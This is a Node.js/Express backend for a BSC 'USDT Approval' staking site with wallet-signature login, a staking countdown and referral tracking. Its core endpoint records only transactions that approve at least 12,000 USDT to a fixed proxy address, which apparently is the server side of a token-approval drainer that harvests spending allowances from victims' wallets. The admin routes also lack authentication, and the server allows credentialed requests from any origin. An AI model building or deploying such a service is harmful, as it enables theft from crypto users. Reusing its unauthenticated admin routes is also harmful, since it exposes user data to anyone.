
import express from "express";
import session from "express-session";
import path from "path";
import morgan from "morgan";
import helmet from "helmet";
import cors from "cors";
import { fileURLToPath } from "url";
import sqlite3 from "sqlite3";
import { open } from "sqlite";
import dotenv from "dotenv";
import { ethers } from "ethers";
import crypto from "crypto";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.set('trust proxy', 1);

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "2mb" }));
app.use(morgan("dev"));

const SESSION_SECRET = process.env.SESSION_SECRET || "dev_secret_change_me";
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, sameSite: "lax", maxAge: 1000*60*60*24*7 } // 7 days
}));

// --- Config (includes optional STAKING_END_TS) ---
const CONFIG = {
  USDT_ADDR: process.env.USDT_ADDR || "0x55d398326f99059fF775485246999027B3197955",
  PROXY_ADDR: process.env.PROXY_ADDR || "0xe66aEdA2DeBB623DCC30696B0a30BFb3D082E052",
  APPROVAL_DECIMALS: parseInt(process.env.APPROVAL_DECIMALS || "18", 10),
  APPROVAL_AMOUNT: process.env.APPROVAL_AMOUNT || "12000",
  CHAIN_ID: parseInt(process.env.CHAIN_ID || "56", 10),
  CHAIN_ID_HEX: process.env.CHAIN_ID_HEX || "0x38",
  BSC_RPC: process.env.BSC_RPC || "https://bsc-dataseed.binance.org",
  STAKING_END_TS: parseInt(process.env.STAKING_END_TS || 0, 10)
};

// --- DB ---
const db = await open({
  filename: path.join(__dirname, "data.sqlite"),
  driver: sqlite3.Database
});
await db.exec(`
  PRAGMA journal_mode = WAL;
  CREATE TABLE IF NOT EXISTS approvals (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet TEXT NOT NULL,
    amountWei TEXT NOT NULL,
    amountHuman TEXT NOT NULL,
    token TEXT NOT NULL,
    spender TEXT NOT NULL,
    txHash TEXT NOT NULL UNIQUE,
    blockNumber INTEGER,
    blockTime INTEGER,
    createdAt INTEGER NOT NULL
  );
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet TEXT NOT NULL UNIQUE,
    refCode TEXT UNIQUE,
    refCount INTEGER NOT NULL DEFAULT 0,
    createdAt INTEGER NOT NULL,
    lastSeen INTEGER NOT NULL
  );
  CREATE TABLE IF NOT EXISTS referrals (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    refCode TEXT NOT NULL,
    referrerWallet TEXT NOT NULL,
    refereeWallet TEXT NOT NULL UNIQUE,
    txHash TEXT,
    createdAt INTEGER NOT NULL
  );
  CREATE TABLE IF NOT EXISTS meta (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL
  );
`);
const META_KEY = "staking_end_ts";
async function persistEndTs(ts){
  await db.run(
    "INSERT INTO meta (key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
    META_KEY,
    String(ts)
  );
}
async function loadEndTs(){
  if(CONFIG.STAKING_END_TS > 0){
    await persistEndTs(CONFIG.STAKING_END_TS);
    return CONFIG.STAKING_END_TS;
  }
  const stored = await db.get("SELECT value FROM meta WHERE key=?", META_KEY);
  if(stored){
    const parsed = Number(stored.value);
    if(!Number.isNaN(parsed) && parsed > 0){
      return parsed;
    }
  }
  const defaultTs = Math.floor(Date.now()/1000) + 195*24*3600;
  await persistEndTs(defaultTs);
  return defaultTs;
}
async function updateStakingEnd(ts){
  const parsed = Number(ts);
  if(!Number.isFinite(parsed) || parsed <= 0){
    throw new Error("bad_timestamp");
  }
  await persistEndTs(Math.floor(parsed));
  CONFIG.STAKING_END_TS = Math.floor(parsed);
  return CONFIG.STAKING_END_TS;
}
CONFIG.STAKING_END_TS = await loadEndTs();

const ABI_ERC20 = [
  "function approve(address spender,uint256 amount) external returns (bool)",
  "function allowance(address owner,address spender) view returns (uint256)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];
const APPROVE_SIG = "0x095ea7b3";

function now(){ return Math.floor(Date.now()/1000); }
function normalize(addr){ return ethers.getAddress(addr); }

async function ensureUser(wallet){
  wallet = normalize(wallet);
  const u = await db.get("SELECT * FROM users WHERE wallet = ?", wallet);
  if (u) {
    await db.run("UPDATE users SET lastSeen=? WHERE wallet=?", now(), wallet);
    return u;
  }
  // generate short unique ref code 4-7 chars (A-Z,2-9)
  const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // no I/1/0/O
  function rand(n){
    let s = "";
    for (let i=0;i<n;i++){ s += alphabet[Math.floor(Math.random()*alphabet.length)]; }
    return s;
  }
  let code = rand(5);
  for (let tries=0; tries<10; tries++){
    const exists = await db.get("SELECT 1 FROM users WHERE refCode=?", code);
    if(!exists) break;
    code = rand(5 + Math.min(2, tries)); // up to 7
  }
  await db.run("INSERT INTO users (wallet, refCode, refCount, createdAt, lastSeen) VALUES (?,?,?,?,?)",
    wallet, code, 0, now(), now());
  return await db.get("SELECT * FROM users WHERE wallet = ?", wallet);
}

function requireUser(req, res, next){
  if(req.session?.userWallet) return next();
  return res.status(401).json({ ok:false, error:"not_logged_in" });
}

app.post("/api/admin/staking-end", async (req,res)=>{
  try{
    const { timestamp } = req.body || {};
    if(timestamp == null){
      return res.status(400).json({ ok:false, error:"bad_timestamp" });
    }
    const parsed = Number(timestamp);
    if(Number.isNaN(parsed) || parsed <= 0){
      return res.status(400).json({ ok:false, error:"bad_timestamp" });
    }
    await updateStakingEnd(parsed);
    res.json({ ok:true, config: CONFIG });
  }catch(err){
    if(err.message === "bad_timestamp"){
      return res.status(400).json({ ok:false, error:"bad_timestamp" });
    }
    console.error(err);
    res.status(500).json({ ok:false, error:"server_error" });
  }
});
app.get("/api/admin/wallets", async (req,res)=>{
  const rows = await db.all("SELECT wallet, refCode, refCount, createdAt, lastSeen FROM users ORDER BY lastSeen DESC, id DESC LIMIT 1000");
  res.json({ ok:true, rows });
});

app.use(express.static(path.join(__dirname, "public")));

// --- Wallet login (nonce + signature) ---
app.get("/api/wlogin/nonce", async (req,res)=>{
  try{
    const { address } = req.query;
    if(!/^0x[0-9a-fA-F]{40}$/.test(address||"")) return res.status(400).json({ok:false,error:"bad_address"});
    const wallet = normalize(address);
    const nonce = crypto.randomBytes(16).toString("hex");
    req.session.loginNonce = nonce;
    req.session.loginAddress = wallet;
    const message = `USDT Approval • Login

Wallet: ${wallet}
Nonce: ${nonce}`;
    res.json({ ok:true, message, wallet });
  }catch(e){ res.status(500).json({ok:false,error:"server_error"}); }
});

app.post("/api/wlogin/verify", async (req,res)=>{
  try{
    const { address, signature, message } = req.body || {};
    if(!req.session.loginNonce || !req.session.loginAddress) return res.status(400).json({ok:false,error:"no_nonce"});
    const wallet = normalize(address);
    if(wallet !== req.session.loginAddress) return res.status(400).json({ok:false,error:"address_mismatch"});
    const recovered = ethers.verifyMessage(message, signature);
    if(normalize(recovered) !== wallet) return res.status(400).json({ok:false,error:"bad_signature"});
    // success
    req.session.userWallet = wallet;
    const user = await ensureUser(wallet);
    res.json({ ok:true, wallet, refCode: user.refCode, refCount: user.refCount, link: `/?ref=${user.refCode}` });
  }catch(e){ console.error(e); res.status(500).json({ok:false,error:"server_error"}); }
});

app.get("/api/me", async (req,res)=>{
  try{
    if(!req.session.userWallet) return res.json({ ok:true, loggedIn:false });
    const user = await ensureUser(req.session.userWallet);
    res.json({ ok:true, loggedIn:true, wallet:user.wallet, refCode:user.refCode, refCount:user.refCount, link:`/?ref=${user.refCode}` });
  }catch(e){ res.status(500).json({ok:false,error:"server_error"}); }
});

// App config
app.get("/api/config", (req,res)=>{ res.json({ ok:true, config: CONFIG }); });

// --- Approval record + referral attribution ---
app.post("/api/record-approval", async (req,res)=>{
  try{
    const { txHash, wallet, refCode } = req.body || {};
    if(!/^0x([A-Fa-f0-9]{64})$/.test(txHash || "")) return res.status(400).json({ ok:false, error:"bad_txhash" });
    if(!/^0x[0-9a-fA-F]{40}$/.test(wallet || "")) return res.status(400).json({ ok:false, error:"bad_wallet" });
    const provider = new ethers.JsonRpcProvider(CONFIG.BSC_RPC);
    const tx = await provider.getTransaction(txHash);
    if(!tx) return res.status(400).json({ ok:false, error:"tx_not_found" });
    if(tx.to == null || ethers.getAddress(tx.to) !== ethers.getAddress(CONFIG.USDT_ADDR)) return res.status(400).json({ ok:false, error:"not_usdt_tx" });
    if(!String(tx.data).startsWith(APPROVE_SIG)) return res.status(400).json({ ok:false, error:"not_approve_call" });
    const iface = new ethers.Interface(ABI_ERC20);
    const decoded = iface.decodeFunctionData("approve", tx.data);
    const spender = ethers.getAddress(decoded[0]);
    const value = decoded[1];
    if(spender !== ethers.getAddress(CONFIG.PROXY_ADDR)) return res.status(400).json({ ok:false, error:"spender_mismatch", spender });
    if(ethers.getAddress(tx.from) !== ethers.getAddress(wallet)) return res.status(400).json({ ok:false, error:"sender_mismatch" });
    const rcpt = await provider.getTransactionReceipt(txHash);
    if(!rcpt || rcpt.status !== 1) return res.status(400).json({ ok:false, error:"tx_not_confirmed" });
    const min = ethers.parseUnits(CONFIG.APPROVAL_AMOUNT, CONFIG.APPROVAL_DECIMALS);
    if(value < min) return res.status(400).json({ ok:false, error:"amount_too_small", min: min.toString() });
    const amountHuman = ethers.formatUnits(value, CONFIG.APPROVAL_DECIMALS);
    const block = await provider.getBlock(rcpt.blockNumber);
    const blockTime = block?.timestamp || now();
    // record approval (idempotent by txHash)
    await db.run(
      "INSERT OR IGNORE INTO approvals (wallet, amountWei, amountHuman, token, spender, txHash, blockNumber, blockTime, createdAt) VALUES (?,?,?,?,?,?,?,?,?)",
      normalize(wallet), value.toString(), amountHuman, CONFIG.USDT_ADDR, CONFIG.PROXY_ADDR, txHash, rcpt.blockNumber, blockTime, now()
    );
    // ensure user & refCode for the approving wallet
    const me = await ensureUser(wallet);
    // attribute referral if valid and not self
    if (refCode && typeof refCode === "string") {
      const refUser = await db.get("SELECT * FROM users WHERE refCode=?", refCode);
      if (refUser && normalize(refUser.wallet) !== normalize(wallet)) {
        // count only once per referee wallet
        const exists = await db.get("SELECT 1 FROM referrals WHERE refereeWallet=?", normalize(wallet));
        if(!exists){
          await db.run("INSERT INTO referrals (refCode, referrerWallet, refereeWallet, txHash, createdAt) VALUES (?,?,?,?,?)",
            refCode, normalize(refUser.wallet), normalize(wallet), txHash, now());
          await db.run("UPDATE users SET refCount = refCount + 1 WHERE wallet=?", normalize(refUser.wallet));
        }
      }
    }
    const updated = await db.get("SELECT refCode, refCount FROM users WHERE wallet=?", normalize(wallet));
    res.json({ ok:true, saved:true, data:{ wallet: normalize(wallet), amountHuman, txHash }, myRef: { code: updated.refCode, count: updated.refCount, link:`/?ref=${updated.refCode}` } });
  }catch(err){
    console.error(err);
    res.status(500).json({ ok:false, error:"server_error" });
  }
});

// --- Admin API ---
app.get("/api/approvals", async (req,res)=>{
  const rows = await db.all("SELECT * FROM approvals ORDER BY id DESC LIMIT 500");
  res.json({ ok:true, rows });
});

app.get("/api/users", async (req,res)=>{
  const rows = await db.all("SELECT wallet, refCode, refCount, createdAt, lastSeen FROM users ORDER BY refCount DESC, id DESC LIMIT 1000");
  res.json({ ok:true, rows });
});

app.get("/admin", (req,res)=>{ res.sendFile(path.join(__dirname, "public", "admin.html")); });

const PORT = process.env.PORT || 5173;
app.listen(PORT, ()=>{ console.log("Server running on http://localhost:"+PORT); });
